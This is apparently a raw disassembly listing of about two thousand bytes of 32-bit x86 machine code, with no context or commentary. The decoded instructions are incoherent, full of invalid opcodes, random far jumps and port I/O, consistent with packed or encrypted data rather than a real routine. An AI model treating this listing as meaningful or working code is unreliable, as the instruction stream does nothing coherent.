  414725:	and    DWORD PTR [ebp+0x4a39d6da],ebx
  41472b:	or     ah,dh
  41472d:	mov    esi,DWORD PTR [ebp+0x5a86d22f]
  414733:	cmp    ah,cl
  414735:	mov    eax,0xf7987552
  41473a:	cmp    al,0xad
  41473c:	das    
  41473d:	je     0x4146e8
  41473f:	scas   eax,DWORD PTR es:[edi]
  414740:	and    al,0x15
  414742:	jbe    0x414702
  414744:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414745:	je     0x41472c
  414747:	pusha  
  414748:	push   ecx
  414749:	jge    0x41472a
  41474b:	data16 jmp 0x4146e6
  41474e:	push   ss
  41474f:	sub    eax,0x32e8f839
  414754:	mov    al,0x8e
  414756:	mov    ch,0x99
  414758:	dec    eax
  414759:	pop    ss
  41475a:	cmp    ah,BYTE PTR [edi]
  41475c:	clc    
  41475d:	push   esp
  41475e:	mov    eax,ds:0x935c45aa
  414763:	loop   0x414744
  414765:	xor    ecx,esp
  414767:	mov    ch,0xc
  414769:	jo     0x4146ee
  41476b:	call   0xb19c:0x253d9a0f
  414772:	fisttp WORD PTR [ebx-0x4a]
  414775:	dec    ecx
  414776:	(bad)  
  414777:	xor    al,0xef
  414779:	cli    
  41477a:	mov    DWORD PTR [ebx-0x3c],ecx
  41477d:	dec    esp
  41477e:	maxps  xmm1,XMMWORD PTR [edi+0x77d1366c]
  414785:	pop    edi
  414786:	cmp    BYTE PTR [esi],ch
  414788:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414789:	add    DWORD PTR [eax+0xc853040],eax
  41478f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414790:	sti    
  414791:	neg    BYTE PTR [ebx-0xc]
  414794:	adc    DWORD PTR [edi-0x69],0xae13ad21
  41479b:	repz or BYTE PTR [edx-0x19],ah
  41479f:	mov    eax,ds:0xf4ab4731
  4147a4:	mov    eax,ds:0x484e9a70
  4147a9:	fst    DWORD PTR [edi+0x179732af]
  4147af:	popaw  
  4147b1:	out    dx,al
  4147b2:	ds pop ss
  4147b4:	dec    esi
  4147b5:	jecxz  0x414764
  4147b7:	cmp    DWORD PTR [eax-0x565fe967],eax
  4147bd:	fsub   st(4),st
  4147bf:	stos   DWORD PTR es:[edi],eax
  4147c0:	aas    
  4147c1:	(bad)  
  4147c3:	xor    al,dh
  4147c5:	fiadd  DWORD PTR [edx+0x425ca52b]
  4147cb:	fnstsw WORD PTR [edi+0x7240d2aa]
  4147d1:	xor    eax,0xa18caf4d
  4147d6:	sbb    BYTE PTR [ecx-0x548fdde0],cl
  4147dc:	add    al,BYTE PTR [eax-0x26ce7871]
  4147e2:	pop    edi
  4147e3:	cmp    DWORD PTR [ebx],0xb4954380
  4147e9:	les    esp,FWORD PTR [edi-0x6c]
  4147ec:	adc    eax,0xd67828b
  4147f1:	ficom  WORD PTR [ecx+0xa57ced8]
  4147f7:	test   al,0x60
  4147f9:	add    DWORD PTR [eax-0x21],esi
  4147fc:	xor    al,0xfc
  4147fe:	repnz pop ds
  414800:	xchg   ecx,eax
  414801:	(bad)  
  414802:	fs mov dh,0x9d
  414805:	mov    edi,0xe26a07e5
  41480a:	sbb    al,0xbf
  41480c:	add    ah,BYTE PTR [ebx]
  41480e:	jge    0x414813
  414810:	xor    cl,BYTE PTR [eax+0x595fc85b]
  414816:	mov    ds:0xfa34a897,al
  41481b:	popf   
  41481c:	dec    edi
  41481d:	jmp    0x677d:0x38ef0595
  414824:	pop    ecx
  414825:	vpmuludq ymm5,ymm0,YMMWORD PTR [ecx+edi*4]
  41482a:	rcr    DWORD PTR [ebx],cl
  41482c:	retf   
  41482d:	lahf   
  41482e:	pop    ebp
  41482f:	mov    esi,0xc0f6d288
  414834:	push   ebp
  414835:	jmp    0x839e:0xe7ce0abe
  41483c:	fbstp  TBYTE PTR [edi+0x6d05469]
  414842:	pop    ebp
  414843:	repz stc 
  414845:	jg     0x4148b2
  414847:	pop    fs
  414849:	sbb    bh,al
  41484b:	(bad)  
  41484c:	push   0xffffffe1
  41484e:	or     al,0xf7
  414850:	iret   
  414851:	int    0xd6
  414853:	jae    0x4147fa
  414855:	in     eax,dx
  414856:	rol    DWORD PTR [edx-0x29],1
  414859:	(bad)  
  41485a:	sub    eax,0x5b215421
  41485f:	call   0x37bf:0xbb3e5fa7
  414866:	xor    dl,BYTE PTR [ebx+ecx*1]
  414869:	inc    esp
  41486a:	retf   0x65f1
  41486d:	cmc    
  41486e:	add    bl,BYTE PTR [ebx]
  414870:	dec    edi
  414871:	add    bl,BYTE PTR [edx+0x55]
  414874:	sub    al,0x31
  414876:	dec    ebp
  414877:	bound  edi,QWORD PTR [eax]
  414879:	sbb    BYTE PTR [ebx+0x34],al
  41487c:	sbb    bl,BYTE PTR [edi]
  41487e:	enter  0xe14a,0xf9
  414882:	lods   al,BYTE PTR ds:[esi]
  414883:	xlat   BYTE PTR ds:[ebx]
  414884:	cmc    
  414885:	inc    edx
  414886:	stos   BYTE PTR es:[edi],al
  414887:	cmp    BYTE PTR [edx+0x53],cl
  41488a:	jle    0x414849
  41488c:	mul    BYTE PTR [edi]
  41488e:	es or  cl,bl
  414891:	push   esi
  414892:	dec    ecx
  414893:	repz pop ss
  414895:	cmc    
  414896:	mov    ds:0x989ada92,eax
  41489b:	xor    al,0xcb
  41489d:	jae    0x4148b9
  41489f:	dec    esi
  4148a0:	push   ebx
  4148a1:	pusha  
  4148a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4148a3:	rcl    BYTE PTR [eax-0x45],cl
  4148a6:	cmp    eax,0x119d6bef
  4148ab:	shr    BYTE PTR [esp+eiz*2+0x49],1
  4148af:	cdq    
  4148b0:	out    dx,al
  4148b1:	iret   
  4148b2:	test   esi,0xfd20e05a
  4148b8:	add    BYTE PTR [ebp+0x6f],al
  4148bb:	les    ebx,FWORD PTR [ecx-0x2d]
  4148be:	adc    eax,0xee7f1f4
  4148c3:	pop    eax
  4148c4:	in     al,dx
  4148c5:	call   0xdddb8afe
  4148ca:	rcl    DWORD PTR [esi+0x7b],1
  4148cd:	loopne 0x4148da
  4148cf:	push   eax
  4148d0:	sub    DWORD PTR [eax],0xffffffa7
  4148d3:	pop    ss
  4148d4:	mov    bl,0xca
  4148d6:	cdq    
  4148d7:	jmp    0xba3e2199
  4148dc:	mov    esp,0xbac62f2f
  4148e1:	jge    0x4148c8
  4148e3:	jecxz  0x4148af
  4148e5:	je     0x414950
  4148e7:	inc    esp
  4148e8:	btr    DWORD PTR [ebx+0x282cb524],ecx
  4148ef:	lds    edi,FWORD PTR ds:0xdea44c3e
  4148f5:	pop    esi
  4148f6:	sub    al,0xb2
  4148f8:	ins    BYTE PTR es:[edi],dx
  4148f9:	mov    ds,WORD PTR [ebp-0x6b]
  4148fc:	fild   QWORD PTR [ebx+0x66]
  4148ff:	ja     0x4148dd
  414901:	xchg   edx,eax
  414903:	in     al,dx
  414904:	push   esi
  414905:	into   
  414906:	out    dx,eax
  414907:	cmp    cl,dl
  414909:	cs inc ebp
  41490b:	fcom   DWORD PTR [ebx+0x27]
  41490e:	(bad)  
  41490f:	cmp    BYTE PTR [eax],ch
  414911:	cmp    bl,BYTE PTR [ebp-0x71ae614d]
  414917:	aad    0xd5
  414919:	jo     0x414935
  41491b:	jmp    0x9879:0x993286f
  414922:	cs lock shr ah,1
  414926:	data16 int3 
  414928:	repnz (bad) 
  41492a:	fwait
  41492b:	std    
  41492c:	jmp    0x5acc:0x5f9a86cf
  414933:	(bad)  
  414935:	pop    esi
  414936:	outs   dx,DWORD PTR ds:[esi]
  414937:	arpl   WORD PTR [edi-0x30cb8ad5],cx
  41493d:	call   0xd7d3:0x128154a
  414944:	enter  0x22e4,0x58
  414948:	mov    ecx,es
  41494a:	div    cl
  41494c:	pop    eax
  41494d:	cmp    BYTE PTR [esi+0x3f],ah
  414950:	and    al,0x0
  414953:	mov    cl,0x34
  414955:	push   eax
  414956:	mov    ds:0x9ebf23c1,eax
  41495b:	frstor ds:0xdd93b5f1
  414961:	outs   dx,DWORD PTR ds:[esi]
  414962:	mov    ch,0x60
  414964:	jecxz  0x41494e
  414966:	gs mov ebp,0x640fb681
  41496c:	mov    eax,ds:0x72d2b126
  414971:	mov    dl,0x4b
  414973:	mov    al,0x83
  414975:	push   eax
  414976:	cmp    BYTE PTR ds:0x72ca491,0x65
  41497d:	stc    
  41497e:	inc    esi
  41497f:	shl    DWORD PTR [esi+ebp*1-0x54],1
  414983:	cmp    bl,bl
  414985:	ss inc ebp
  414987:	adc    esi,ebx
  414989:	and    al,0x62
  41498b:	jle    0x4149c5
  41498d:	ds loopne 0x414991
  414990:	jle    0x4149b7
  414992:	mov    ebp,0xbba3608a
  414997:	outs   dx,DWORD PTR ds:[esi]
  414998:	sub    esp,esp
  41499a:	cli    
  41499b:	xchg   ebx,eax
  41499c:	mov    bl,BYTE PTR [eax+0x23]
  41499f:	rol    DWORD PTR [edi-0x3d],1
  4149a2:	aas    
  4149a3:	mov    ebp,0x1818d87f
  4149a8:	push   edx
  4149a9:	fnstenv [esi+ebx*2-0xc8fceca]
  4149b0:	shl    DWORD PTR [edx+edx*1+0x39],0xff
  4149b5:	and    edi,DWORD PTR [edi-0x1c214d1e]
  4149bb:	push   es
  4149bc:	loop   0x414998
  4149be:	dec    esi
  4149bf:	fst    QWORD PTR [ebp+0x5d840421]
  4149c5:	pop    esp
  4149c6:	pop    ebp
  4149c7:	cmp    eax,0xd406810f
  4149cc:	stos   BYTE PTR es:[edi],al
  4149cd:	repz pop ebx
  4149cf:	leave  
  4149d0:	adc    bh,BYTE PTR [esi]
  4149d2:	push   esi
  4149d3:	push   esp
  4149d4:	push   es
  4149d5:	dec    esi
  4149d6:	cs out 0xe4,al
  4149d9:	out    0x88,al
  4149db:	jmp    0x414968
  4149dd:	jp     0x414986
  4149df:	xchg   ebp,eax
  4149e0:	mov    al,0x8e
  4149e2:	ins    DWORD PTR es:[edi],dx
  4149e3:	push   ecx
  4149e4:	into   
  4149e5:	xor    bh,al
  4149e7:	cmp    WORD PTR [ebp-0x8],dx
  4149eb:	(bad)  
  4149ec:	adc    ah,cl
  4149ee:	loop   0x414a4c
  4149f0:	in     al,0x12
  4149f2:	or     al,0xdc
  4149f4:	cmp    DWORD PTR [ebp+ebx*4+0x614198c7],ecx
  4149fb:	add    DWORD PTR [ebp+0x74],ebp
  4149fe:	xor    BYTE PTR [ecx-0x253c15d6],0xf1
  414a05:	jge    0x414a5d
  414a07:	dec    esp
  414a08:	push   edx
  414a09:	pop    ecx
  414a0a:	mov    esi,0x65c0553e
  414a0f:	jecxz  0x414a1c
  414a11:	inc    ebp
  414a12:	in     eax,dx
  414a13:	retf   0xb43
  414a16:	outs   dx,DWORD PTR ds:[esi]
  414a17:	xor    al,bh
  414a19:	dec    esp
  414a1a:	xor    al,0x4b
  414a1c:	adc    ah,BYTE PTR [edi-0x75cd7c0e]
  414a22:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  414a24:	jb     0x414a5e
  414a26:	cmp    DWORD PTR [ebx],0x53
  414a29:	pushf  
  414a2a:	retf   
  414a2b:	imul   ecx,DWORD PTR [esi],0xffffffe1
  414a2e:	xor    cl,dl
  414a30:	dec    eax
  414a31:	cdq    
  414a32:	inc    esp
  414a33:	jb     0x4149e3
  414a35:	call   0x889:0xfe758263
  414a3c:	add    BYTE PTR [edi+eiz*8+0x61c210b5],ch
  414a43:	xlat   BYTE PTR ds:[ebx]
  414a44:	addr16 mov esi,ebp
  414a47:	push   edx
  414a48:	loop   0x414aa1
  414a4a:	hlt    
  414a4b:	shl    DWORD PTR [edx],1
  414a4d:	imul   edx,DWORD PTR [ecx+0x41562f2e],0xc5c96be7
  414a57:	sub    al,0x18
  414a59:	js     0x414aa8
  414a5b:	jno    0x414a0b
  414a5d:	mov    ah,0xf1
  414a5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a60:	adc    ch,bh
  414a62:	dec    edi
  414a63:	mov    es:0xcba643e3,al
  414a69:	sbb    eax,0xf1f4a48a
  414a6e:	je     0x414ab2
  414a70:	jo     0x414abc
  414a72:	xchg   esi,eax
  414a73:	icebp  
  414a74:	push   es
  414a75:	mov    cl,0x88
  414a77:	xchg   BYTE PTR [edi],dl
  414a79:	or     esp,eax
  414a7b:	inc    ebx
  414a7c:	test   DWORD PTR [ebx],ebx
  414a7e:	mov    edi,0x42a58608
  414a83:	inc    edx
  414a84:	dec    edi
  414a85:	jno    0x414ac6
  414a87:	mov    es,WORD PTR [ebx+0x5a]
  414a8a:	dec    ecx
  414a8b:	int    0x36
  414a8d:	fdivr  DWORD PTR [eax+0x38]
  414a90:	ins    DWORD PTR es:[edi],dx
  414a91:	addr16 ret 0x212d
  414a95:	xchg   edi,eax
  414a96:	and    ecx,DWORD PTR [ebp+ecx*8-0x336db2d3]
  414a9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a9e:	xchg   ebp,eax
  414a9f:	repz cmp BYTE PTR [eax-0x696ea899],ch
  414aa6:	push   ds
  414aa7:	das    
  414aa8:	jo     0x414ad5
  414aaa:	push   ebp
  414aab:	jo     0x414b12
  414aad:	or     eax,0x291b5c85
  414ab2:	cdq    
  414ab3:	fisub  DWORD PTR [edx+0x2a34f7c8]
  414ab9:	(bad)  
  414aba:	pop    ds
  414abb:	ins    BYTE PTR es:[edi],dx
  414abc:	add    BYTE PTR [ebp-0x21],bl
  414abf:	stos   DWORD PTR es:[edi],eax
  414ac0:	mov    ch,0x4e
  414ac2:	jge    0x414a7b
  414ac4:	add    bh,BYTE PTR [ecx-0x70]
  414ac7:	es aaa 
  414ac9:	xchg   BYTE PTR [edx+0x6e639688],dh
  414acf:	fstp   TBYTE PTR [edi]
  414ad1:	arpl   di,sp
  414ad3:	add    edx,ebx
  414ad5:	mov    DWORD PTR [edi],ecx
  414ad7:	pushf  
  414ad8:	or     al,0x77
  414ada:	dec    esi
  414adb:	loope  0x414b09
  414add:	push   ebx
  414ade:	iret   
  414adf:	dec    ecx
  414ae0:	cdq    
  414ae1:	xchg   BYTE PTR [edi],dh
  414ae3:	cs mov cl,0xa9
  414ae6:	pop    es
  414ae7:	pop    es
  414ae8:	sbb    eax,0x30c479d4
  414aed:	fild   QWORD PTR [ebx+ebx*2-0xe]
  414af1:	test   DWORD PTR [ebp-0x3d2aa257],ebx
  414af7:	loopne 0x414aea
  414af9:	fadd   DWORD PTR [esi+0x6ea828d6]
  414aff:	adc    al,0x60
  414b01:	mov    dh,0x6f
  414b03:	in     eax,0x46
  414b05:	mov    ebp,0xaf634878
  414b0a:	pop    edx
  414b0b:	push   ebp
  414b0c:	in     eax,dx
  414b0d:	mov    eax,esi
  414b0f:	sbb    dl,bl
  414b11:	xchg   BYTE PTR ds:0xfe38459b,ah
  414b17:	(bad)  
  414b18:	cs adc al,0xfd
  414b1b:	pushw  0xffcd
  414b1e:	cmp    esp,DWORD PTR [eax]
  414b20:	(bad)  
  414b22:	ffreep st(4)
  414b24:	or     al,0x26
  414b26:	pop    ss
  414b27:	rcr    BYTE PTR [ecx-0x17c8e8d1],1
  414b2d:	sub    eax,0xad352b1c
  414b32:	int3   
  414b33:	jnp    0x414b0d
  414b35:	push   0xffffffa3
  414b37:	cmp    eax,0x321b3620
  414b3c:	loop   0x414b15
  414b3e:	loope  0x414b8c
  414b40:	cmp    cl,0x7
  414b43:	es mov al,0xbd
  414b46:	cmp    esp,DWORD PTR [esi+0x21]
  414b49:	ja     0x414ba1
  414b4b:	inc    edx
  414b4c:	or     eax,0x44598622
  414b51:	mov    BYTE PTR [edx*1+0x7dc60903],ch
  414b58:	loop   0x414b6f
  414b5a:	sbb    BYTE PTR [eax+0x30bb829a],cl
  414b60:	out    0x41,eax
  414b62:	cmc    
  414b63:	mov    cl,0x43
  414b65:	enter  0x3938,0x5d
  414b69:	mov    ch,BYTE PTR ds:0xd0de73e4
  414b6f:	xlat   BYTE PTR ds:[ebx]
  414b70:	int3   
  414b71:	retf   0x370f
  414b74:	cmp    dl,ah
  414b76:	jmp    FWORD PTR [ebp-0x39b1587e]
  414b7c:	xchg   ebx,eax
  414b7d:	stos   DWORD PTR es:[edi],eax
  414b7e:	push   ebp
  414b7f:	xchg   DWORD PTR [edi+0x53],esp
  414b82:	and    eax,0x6b264b58
  414b87:	cmc    
  414b88:	xchg   ecx,eax
  414b89:	imul   ecx,DWORD PTR [edx-0x61],0x20
  414b8d:	outs   dx,BYTE PTR ds:[esi]
  414b8e:	repnz (bad) 
  414b90:	es mov ebp,0xc1c40ee1
  414b96:	pushf  
  414b97:	lods   eax,DWORD PTR ds:[esi]
  414b98:	stc    
  414b99:	or     al,0x44
  414b9b:	ds jne 0x414b80
  414b9e:	or     ebp,DWORD PTR [ebp+0x12]
  414ba1:	cdq    
  414ba2:	out    0x54,eax
  414ba4:	xor    BYTE PTR [edx+0x4a],dl
  414ba7:	(bad)  
  414ba8:	mov    ecx,0x68ca5905
  414bad:	lods   al,BYTE PTR ds:[esi]
  414bae:	mov    DWORD PTR [esi+ecx*2],eax
  414bb1:	ins    DWORD PTR es:[edi],dx
  414bb2:	mov    esi,0xd3ed724b
  414bb7:	fs pop esi
  414bb9:	hlt    
  414bba:	add    ebx,ebx
  414bbc:	retf   0xef4d
  414bbf:	inc    edi
  414bc0:	shl    cl,cl
  414bc2:	push   cs
  414bc3:	fbld   TBYTE PTR [edi]
  414bc5:	push   ss
  414bc6:	mov    bh,0x9
  414bc8:	in     al,0xff
  414bca:	scas   al,BYTE PTR es:[edi]
  414bcb:	cld    
  414bcc:	rol    BYTE PTR [ebx+eax*8],cl
  414bcf:	imul   ebx,DWORD PTR [esi],0x5e09b747
  414bd5:	pushf  
  414bd6:	dec    eax
  414bd7:	shl    BYTE PTR [ecx],1
  414bd9:	inc    esp
  414bda:	outs   dx,DWORD PTR ds:[esi]
  414bdb:	xlat   BYTE PTR ds:[ebx]
  414bdc:	and    BYTE PTR [ebp-0xef433b8],0x40
  414be3:	and    DWORD PTR [ecx-0x4e],ebp
  414be6:	dec    ebp
  414be7:	daa    
  414be8:	jecxz  0x414c64
  414bea:	test   eax,0x67d66984
  414bef:	adc    DWORD PTR [eax+eiz*1-0x3d],esp
  414bf3:	fldenv [esi-0xd]
  414bf6:	or     esi,DWORD PTR [edi+0x13]
  414bf9:	jmp    0xf877:0x6bac30b6
  414c00:	retf   
  414c01:	arpl   WORD PTR [ecx+0x2543b467],bp
  414c07:	mov    es,esp
  414c09:	ret    0x9423
  414c0c:	inc    edi
  414c0d:	cmp    BYTE PTR [eax+0x479bc83a],dh
  414c13:	cs dec ebx
  414c15:	shr    BYTE PTR [ecx+0x28],1
  414c18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c19:	rep ins BYTE PTR es:[edi],dx
  414c1b:	and    DWORD PTR cs:[eax+ebp*4],edx
  414c1f:	xchg   ebx,eax
  414c20:	int3   
  414c21:	mov    ds:0x6c9f30d6,al
  414c26:	or     eax,0xa220aac4
  414c2b:	push   edi
  414c2c:	sub    al,bh
  414c2e:	cli    
  414c2f:	aam    0xf3
  414c31:	cli    
  414c32:	xlat   BYTE PTR ds:[ebx]
  414c33:	push   0x7d
  414c35:	xor    al,0x45
  414c37:	ffree  st(3)
  414c39:	mov    cl,0xd
  414c3b:	jae    0x414cab
  414c3d:	ret    0x4520
  414c40:	push   cs
  414c41:	add    ah,BYTE PTR [ecx+ebx*2]
  414c44:	or     eax,0x94662259
  414c49:	cwde   
  414c4a:	retf   
  414c4b:	fadd   DWORD PTR [esi-0x3b]
  414c4e:	out    dx,al
  414c4f:	jg     0x414c69
  414c51:	xor    ebp,eax
  414c53:	inc    esp
  414c54:	push   ebp
  414c55:	sub    edx,esi
  414c57:	adc    ch,BYTE PTR [ebx+0x55]
  414c5a:	popf   
  414c5b:	xor    DWORD PTR ds:[ecx-0x5b1d0113],ebp
  414c62:	or     ebp,ebp
  414c64:	push   edx
  414c65:	inc    ecx
  414c66:	or     ecx,eax
  414c68:	cmp    al,al
  414c6a:	cwde   
  414c6b:	xor    al,0xe6
  414c6d:	int    0x1
  414c6f:	fs push 0xf8ab9f76
  414c75:	test   BYTE PTR [ecx],al
  414c77:	fisub  WORD PTR [eax]
  414c79:	mov    BYTE PTR [ebp+0x38],cl
  414c7c:	cwde   
  414c7d:	(bad)  
  414c7e:	out    dx,al
  414c7f:	mov    eax,ds:0x588e1658
  414c84:	adc    eax,0xb0fc0d52
  414c89:	ret    0xb67c
  414c8c:	mov    ebx,0x41cc487f
  414c91:	call   0xa9ce1d9e
  414c96:	int3   
  414c97:	popf   
  414c98:	cld    
  414c99:	pop    eax
  414c9a:	aad    0xb5
  414c9c:	adc    ebp,ebp
  414c9e:	jae    0x414ca1
  414ca0:	call   0x25c7:0xd02eeec4
  414ca7:	add    edx,0xe35e083f
  414cad:	or     al,0x79
  414caf:	pushf  
  414cb0:	xchg   edx,eax
  414cb1:	inc    edi
  414cb2:	cmp    eax,0x152fc8a9
  414cb7:	js     0x414ce1
  414cb9:	mov    bh,0xa3
  414cbb:	pop    ecx
  414cbc:	fcmovb st,st(4)
  414cbe:	inc    eax
  414cbf:	xor    ecx,DWORD PTR [ebx+0x78]
  414cc2:	cwde   
  414cc3:	and    al,0x16
  414cc5:	gs out dx,al
  414cc7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414cc8:	adc    eax,0x1789e79
  414ccd:	test   DWORD PTR [ecx-0x79],esp
  414cd0:	mov    dh,0x6e
  414cd2:	sbb    eax,DWORD PTR [edi+edx*2+0x5ec0ddf3]
  414cd9:	loopne 0x414d06
  414cdb:	mov    esp,0xaebad66a
  414ce0:	jno    0x414d30
  414ce2:	(bad)  [edx]
  414ce4:	pop    edi
  414ce5:	and    cl,BYTE PTR ds:0x3fa13a18
  414ceb:	pop    ecx
  414cec:	cdq    
  414ced:	scas   eax,DWORD PTR es:[edi]
  414cee:	jg     0x414c7d
  414cf0:	xchg   ebp,eax
  414cf1:	ficomp WORD PTR [esi-0x49fbbb40]
  414cf7:	pop    ss
  414cf8:	push   cs
  414cf9:	jge    0x414cd1
  414cfb:	test   eax,0x79824691
  414d00:	nop
  414d01:	ret    0x4e23
  414d04:	icebp  
  414d05:	dec    ecx
  414d06:	xchg   esi,eax
  414d07:	dec    edx
  414d08:	mov    edx,0x3fd72f92
  414d0d:	into   
  414d0e:	add    ah,BYTE PTR [eax]
  414d10:	dec    edi
  414d11:	scas   al,BYTE PTR es:[edi]
  414d12:	jecxz  0x414d0a
  414d14:	push   edx
  414d15:	push   es
  414d16:	push   ebx
  414d17:	imul   DWORD PTR [ebp+0x4b]
  414d1a:	ja     0x414d86
  414d1c:	inc    ecx
  414d1d:	push   ecx
  414d1e:	push   cs
  414d1f:	inc    eax
  414d20:	xchg   ecx,eax
  414d21:	pop    es
  414d22:	push   esp
  414d23:	in     eax,0x27
  414d25:	repnz and al,0x4
  414d28:	into   
  414d29:	sub    ch,BYTE PTR [ebp-0xfc85afc]
  414d2f:	das    
  414d30:	xchg   ebp,eax
  414d31:	fimul  DWORD PTR ds:0x57fb6185
  414d37:	jae    0x414d42
  414d39:	sub    al,0x95
  414d3b:	repnz aam 0x6a
  414d3e:	push   edi
  414d3f:	push   cs
  414d40:	scas   eax,DWORD PTR es:[edi]
  414d41:	not    BYTE PTR [ebp-0x39]
  414d44:	xchg   al,ch
  414d46:	stos   BYTE PTR es:[edi],al
  414d47:	cli    
  414d48:	fs cmp esp,ebx
  414d4b:	aas    
  414d4c:	mov    ch,BYTE PTR [ebp+0x6795c5f5]
  414d52:	mov    ecx,0x267c2269
  414d57:	in     al,0xf
  414d59:	lods   eax,DWORD PTR ds:[esi]
  414d5a:	call   0x8c9b7708
  414d5f:	jmp    0xbbe836c5
  414d64:	sbb    eax,0x3af7319f
  414d69:	popf   
  414d6a:	addr16 push ss
  414d6c:	ss or  al,0xd8
  414d6f:	mov    ebx,0x689e0b9f
  414d74:	mov    dl,0xef
  414d76:	xchg   ebp,eax
  414d77:	push   esi
  414d78:	mov    ebp,0x78626cea
  414d7d:	test   al,0xe1
  414d7f:	sbb    DWORD PTR ds:0x74532e0f,eax
  414d85:	sub    eax,0x134fe05e
  414d8a:	mov    esi,0xb551ccc8
  414d8f:	jne    0x414d91
  414d91:	sbb    cl,0xd5
  414d94:	sbb    BYTE PTR [edi+edi*1+0x78],bl
  414d98:	(bad)  
  414d99:	sar    DWORD PTR [edi],1
  414d9b:	push   ebp
  414d9c:	adc    BYTE PTR [edx+0x9],dl
  414d9f:	inc    ebp
  414da0:	cli    
  414da1:	push   0x6ca36443
  414da6:	fistp  WORD PTR [ebx]
  414da8:	jl     0x414d31
  414daa:	(bad)  
  414dab:	ficom  WORD PTR [edx+ebp*2+0x35]
  414daf:	lock push cs
  414db1:	loopne 0x414dfa
  414db3:	shl    DWORD PTR [edx-0x26],cl
  414db6:	lahf   
  414db7:	dec    esp
  414db8:	and    DWORD PTR [eax],ebp
  414dba:	lods   al,BYTE PTR ds:[esi]
  414dbb:	mov    eax,ds:0xd2fc182a
  414dc0:	pop    esp
  414dc1:	(bad)  
  414dc2:	leave  
  414dc3:	add    edi,DWORD PTR [ebp+ecx*4-0xf842c82]
  414dca:	and    BYTE PTR [ebx-0x403443f5],bl
  414dd0:	jmp    0xbc06:0xb909fe01
  414dd7:	int    0x64
  414dd9:	fistp  DWORD PTR [edx-0x6a]
  414ddc:	lods   al,BYTE PTR ds:[esi]
  414ddd:	sbb    eax,0xf7ad8d18
  414de2:	mov    dh,0x61
  414de4:	aam    0x14
  414de6:	adc    eax,0xa38c8c5a
  414deb:	adc    eax,0x6e
  414dee:	call   0x442a:0x17af0e2b
  414df5:	fcom   DWORD PTR [eax-0x12329c26]
  414dfb:	push   0xffffffdc
  414dfd:	or     al,0x99
  414dff:	pop    edx
  414e00:	adc    eax,0xa6bd281e
  414e05:	sahf   
  414e06:	or     ah,ch
  414e08:	ss sbb al,dh
  414e0b:	or     eax,DWORD PTR [ebp+0x5c73a059]
  414e11:	sub    eax,0x507cd646
  414e16:	and    al,0x56
  414e18:	sti    
  414e19:	sub    eax,0xf7438d6e
  414e1e:	jb     0x414df3
  414e20:	xor    al,0x66
  414e22:	outs   dx,DWORD PTR ds:[esi]
  414e23:	mov    al,ds:0x80f2c1ee
  414e28:	popf   
  414e29:	sbb    al,BYTE PTR [ecx]
  414e2b:	arpl   WORD PTR [esi-0x6bd3e36c],di
  414e31:	jne    0x414dfe
  414e33:	push   ss
  414e34:	mov    ch,0x53
  414e36:	and    al,0xf4
  414e38:	pop    ecx
  414e39:	jae    0x414e64
  414e3b:	and    ebx,esi
  414e3d:	hlt    
  414e3e:	xchg   dh,ch
  414e40:	xchg   edi,eax
  414e41:	sti    
  414e42:	fs mov ebp,0x78be540e
  414e48:	sbb    eax,0x81b4b1ca
  414e4d:	(bad)  
  414e4e:	or     esp,edx
  414e50:	inc    eax
  414e51:	xchg   ecx,eax
  414e52:	dec    DWORD PTR [edx+0x4a2a5d9c]
  414e58:	mov    esp,0xc25371e9
  414e5d:	xchg   BYTE PTR [edx+ebp*8],ah
  414e60:	pusha  
  414e61:	arpl   bx,ax
  414e63:	jno    0x414df8
  414e65:	arpl   WORD PTR [ebx+edx*1+0x3c],dx
  414e69:	fcomp  QWORD PTR [ebx]
  414e6b:	fld    TBYTE PTR [esi+0x4]
  414e6e:	pop    edi
  414e6f:	retf   
  414e70:	push   esp
  414e71:	sub    edi,DWORD PTR [ebp+esi*2-0x4021d85e]
  414e78:	pop    ecx
  414e79:	test   al,0xd0
  414e7b:	mov    ds:0xfb691378,al
  414e80:	mov    ch,0x9e
  414e82:	aad    0xe2
  414e84:	pop    DWORD PTR [edi]
  414e86:	scas   eax,DWORD PTR es:[edi]
  414e87:	lds    edi,FWORD PTR [ebx+0x57]
  414e8a:	or     ebx,DWORD PTR [edx]
  414e8c:	pop    ebp
  414e8d:	mov    dl,0xff
  414e8f:	scas   eax,DWORD PTR es:[edi]
  414e90:	and    eax,0xf6c4c57
  414e95:	cmp    edx,DWORD PTR [esi]
  414e97:	sbb    eax,0x18722a52
  414e9c:	ror    BYTE PTR [edi],cl
  414e9e:	xchg   DWORD PTR [eax-0x9],edx
  414ea1:	mov    ch,0x25
  414ea3:	scas   al,BYTE PTR es:[edi]
  414ea4:	pop    es
  414ea5:	pop    edi
  414ea6:	jmp    0x414ef3
  414ea8:	les    esp,FWORD PTR [edx+edi*1]
  414eab:	pop    edx
  414eac:	fdiv   DWORD PTR [eax]
  414eae:	mov    al,ds:0x6a8fe85e
  414eb3:	or     al,0x6c
  414eb5:	cmc    
  414eb6:	(bad)  
  414eb7:	js     0x414e4c
  414eb9:	mov    edx,0x50d5a8e4
  414ebe:	cli    
  414ebf:	(bad)  
  414ec0:	pop    esi
  414ec1:	test   al,0xfb
  414ec3:	pop    esp
  414ec4:	test   DWORD PTR [ebp-0xb],0x5eb61e82
  414ecb:	ins    DWORD PTR es:[edi],dx
  414ecc:	dec    edx
  414ecd:	(bad)  
  414ece:	addr16 retf 
  414ed0:	pop    es
  414ed1:	xchg   DWORD PTR [edi],ecx
  414ed3:	pop    es
  414ed4:	xor    cl,al
  414ed6:	int3   
  414ed7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ed8:	addr16 sbb dh,0xa0
  414edc:	or     DWORD PTR ds:0x333434e,eax
  414ee2:	clc    
  414ee3:	pushf  
  414ee4:	mul    BYTE PTR [eax-0x8]
  414ee7:	mov    BYTE PTR [ecx+0x16489775],bh
  414eed:	sbb    al,0x17
  414eef:	clc    
  414ef0:	push   ss
  414ef1:	adc    ebp,DWORD PTR [esi]
